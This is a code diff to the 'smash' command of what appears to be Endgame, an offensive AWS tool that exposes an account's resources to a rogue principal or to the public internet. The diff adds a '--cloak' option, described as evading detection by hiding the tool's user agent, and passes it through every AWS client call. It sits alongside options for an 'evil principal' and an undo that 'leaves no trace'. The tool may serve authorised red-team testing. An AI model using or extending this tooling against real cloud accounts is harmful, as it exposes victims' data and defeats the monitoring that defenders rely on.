@@ -4,7 +4,6 @@ Smash your AWS Account to pieces by exposing massive amounts of resources to a r
 import logging
 import click
 import boto3
-import tabulate
 from policy_sentry.util.arns import (
     parse_arn_for_resource_type,
     get_resource_path_from_arn,
@@ -13,8 +12,7 @@ from endgame import set_log_level
 from endgame.shared.aws_login import get_boto3_client, get_current_account_id
 from endgame.shared.validate import click_validate_supported_aws_service, click_validate_user_or_principal_arn
 from endgame.shared import utils, constants
-from endgame.command.list_resources import get_all_resources_for_all_services, get_all_resources, \
-    list_resources_by_service
+from endgame.command.list_resources import get_all_resources_for_all_services, list_resources_by_service
 from endgame.command.expose import expose_service
 from endgame.shared.response_message import ResponseMessage
 
@@ -72,18 +70,25 @@ logger = logging.getLogger(__name__)
     help="Undo the previous modifications and leave no trace",
 )
 @click.option(
+    "--cloak",
+    "-c",
+    is_flag=True,
+    default=False,
+    help="Evade detection by using the default AWS SDK user agent instead of one that indicates usage of this tool.",
+)
+@click.option(
     "-v",
     "--verbose",
     "verbosity",
     count=True,
 )
-def smash(service, evil_principal, profile, region, dry_run, undo, verbosity):
+def smash(service, evil_principal, profile, region, dry_run, undo, cloak, verbosity):
     """
     Smash your AWS Account to pieces by exposing massive amounts of resources to a rogue principal or to the internet
     """
     set_log_level(verbosity)
     # Get the current account ID
-    sts_client = get_boto3_client(profile=profile, service="sts", region=region)
+    sts_client = get_boto3_client(profile=profile, service="sts", region=region, cloak=cloak)
     current_account_id = get_current_account_id(sts_client=sts_client)
     principal_type = parse_arn_for_resource_type(evil_principal)
     principal_name = get_resource_path_from_arn(evil_principal)
@@ -91,9 +96,9 @@ def smash(service, evil_principal, profile, region, dry_run, undo, verbosity):
     if service == "all":
         # TODO: Big scary warning message and confirmation
         results = get_all_resources_for_all_services(profile=profile, region=region,
-                                                     current_account_id=current_account_id)
+                                                     current_account_id=current_account_id, cloak=cloak)
     else:
-        client = get_boto3_client(profile=profile, service=service, region=region)
+        client = get_boto3_client(profile=profile, service=service, region=region, cloak=cloak)
         result = list_resources_by_service(provided_service=service, region=region,
                                            current_account_id=current_account_id, client=client)
         results.extend(result.resources)
@@ -112,7 +117,7 @@ def smash(service, evil_principal, profile, region, dry_run, undo, verbosity):
         region = resource.region
         translated_service = utils.get_service_translation(provided_service=resource.service)
         client = None
-        client = get_boto3_client(profile=profile, service=translated_service, region=region)
+        client = get_boto3_client(profile=profile, service=translated_service, region=region, cloak=cloak)
         response_message = smash_resource(service=translated_service, region=region, name=name,
                                           current_account_id=current_account_id,
                                           client=client, undo=undo, dry_run=dry_run, evil_principal=evil_principal)
